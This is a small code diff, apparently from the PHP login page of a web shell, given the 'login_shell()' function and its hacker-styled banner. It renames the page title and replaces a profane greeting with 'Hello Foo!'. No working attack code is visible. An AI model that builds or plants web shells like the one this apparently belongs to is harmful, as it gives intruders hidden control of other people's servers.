@@ -7,7 +7,7 @@ function login_shell()
 ?>
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
-<title>Unknown Person</title>
+<title>Mr Shuji</title>
 <body>
 <style type="text/css">
 h1 {color: #333;font-size: 50px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Orbitron;}
@@ -88,7 +88,7 @@ window.onerror = ClearError;
 <h1>Unknown Person</h1>
  
  
-<div id="matrix" class="auto-style8">Fucking Knobhead!</div><br>
+<div id="matrix" class="auto-style8">Hello Foo!</div><br>
 <font face="courier new" color="Red" size"10" >Born, Work, Die
  </font>
  
